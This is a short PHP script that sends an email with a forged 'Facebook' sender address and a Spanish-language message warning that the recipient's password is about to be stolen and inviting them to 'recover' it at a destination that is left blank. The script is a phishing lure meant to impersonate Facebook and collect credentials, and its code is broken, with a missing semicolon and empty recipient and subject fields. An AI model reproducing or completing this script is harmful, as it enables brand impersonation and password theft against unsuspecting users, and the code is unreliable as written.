<?php
ini_set('display_errors', 1 );
    error_reporting(E_ALL );
    $from = "Facebook@gmail.com";
    $to = "";
    $subject = "";
    $message = "Te van a robar la contraseña para recuperarla entra en: "
    $headers = "From:" . $from;
    mail($to,$subject,$message,$headers);
    echo"El mensaje se ha enviado";

?>